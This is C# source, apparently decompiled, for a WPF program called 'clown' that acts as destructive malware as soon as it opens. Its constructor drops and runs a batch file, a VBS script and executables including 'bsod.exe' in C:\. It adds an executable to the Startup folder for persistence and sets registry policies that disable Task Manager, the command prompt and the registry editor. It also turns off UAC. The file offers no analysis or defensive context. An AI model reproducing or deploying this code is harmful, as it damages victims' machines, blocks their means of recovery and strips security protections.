using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Windows;
using System.Windows.Markup;
using Microsoft.Win32;
using clown.Properties;

namespace clown;

public class MainWindow : Window, IComponentConnector
{
	private bool _contentLoaded;

	public MainWindow()
	{
		File.WriteAllBytes("C:\\" + "turnOff.bat", Resources.turnOff);
		Process.Start(new ProcessStartInfo("C:\\" + "turnOff.bat")
		{
			CreateNoWindow = true,
			UseShellExecute = true
		});
		InitializeComponent();
		payloads();
		DisableLua();
	}

	public void payloads()
	{
		File.WriteAllBytes("C:\\" + "bsod.exe", Resources.bsod);
		File.WriteAllBytes("C:\\" + "bgImg.jpg", Resources.bgImg);
		File.WriteAllBytes("C:\\" + "csCreepy.cur", Resources.csCreepy);
		File.WriteAllBytes("C:\\" + "regvbs.vbs", Resources.regvbs);
		File.WriteAllBytes("C:\\" + "clownForm.exe", Resources.clownForm);
		File.WriteAllBytes("C:\\" + "draw.exe", Resources.draw);
		Process.Start(new ProcessStartInfo("C:\\" + "regvbs.vbs")
		{
			CreateNoWindow = true,
			UseShellExecute = true
		});
		File.Copy("C:\\clownForm.exe", "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\clownForm.exe");
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		registryKey.Close();
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\System");
		registryKey2.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
		registryKey2.Close();
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System");
		registryKey3.SetValue("DisableRegistrytools", 1, RegistryValueKind.DWord);
		registryKey3.Close();
	}

	private void DisableLua()
	{
		RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System");
		registryKey!.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		registryKey!.Close();
	}

	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	public void InitializeComponent()
	{
		if (!_contentLoaded)
		{
			_contentLoaded = true;
			Uri uri = new Uri("/clown;component/mainwindow.xaml", UriKind.Relative);
			Application.LoadComponent((object)this, uri);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		_contentLoaded = true;
	}
}
